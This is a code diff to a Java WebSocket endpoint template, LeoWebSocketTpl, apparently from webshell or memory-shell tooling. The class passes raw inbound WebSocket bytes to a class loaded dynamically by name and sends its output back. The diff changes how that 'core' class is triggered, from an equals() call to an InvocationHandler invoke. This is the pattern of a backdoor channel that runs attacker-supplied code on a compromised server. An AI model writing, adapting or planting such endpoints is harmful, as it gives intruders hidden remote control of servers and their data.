@@ -127,7 +127,11 @@ public class LeoWebSocketTpl extends javax.websocket.Endpoint implements javax.w
                 bufferedInboundBytes.addAndGet(-request.length);
                 java.io.ByteArrayOutputStream coreStream = new java.io.ByteArrayOutputStream();
                 coreStream.write(request);
-                Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance().equals(coreStream);
+                try {
+                    ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance()).invoke(null, null, new Object[]{coreStream});
+                } catch (Throwable e) {
+                    throw new IllegalStateException("Core invocation failed", e);
+                }
                 byte[] response = coreStream.toByteArray();
                 if (response.length > MAX_MESSAGE_BYTES) {
                     throw new java.io.IOException("response exceeds message limit");
